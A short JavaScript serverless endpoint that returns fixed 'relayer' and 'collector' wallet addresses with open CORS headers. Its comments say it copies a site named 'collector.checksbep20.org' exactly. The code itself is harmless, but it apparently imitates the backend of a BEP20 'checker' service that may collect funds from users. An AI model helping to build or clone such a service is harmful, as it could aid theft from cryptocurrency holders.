// ============================================
// ROOT ENDPOINT - Returns relayer and collector addresses
// Exactly like: https://collector.checksbep20.org/
// ============================================

export default function handler(req, res) {
    // Set CORS headers
    res.setHeader('Access-Control-Allow-Origin', '*');
    res.setHeader('Access-Control-Allow-Methods', 'GET, POST, OPTIONS');
    res.setHeader('Access-Control-Allow-Headers', 'Content-Type, X-Topup-Secret');
    
    // Handle OPTIONS preflight
    if (req.method === 'OPTIONS') {
        return res.status(200).end();
    }
    
    // Return same format as original
    return res.status(200).json({
        ok: true,
        relayer: "0xDb867b88EAB55320fD50E9785B2906773dedf78b",
        collector: "0x5681d680B047bF5b12939625C56301556991005e"
    });
}
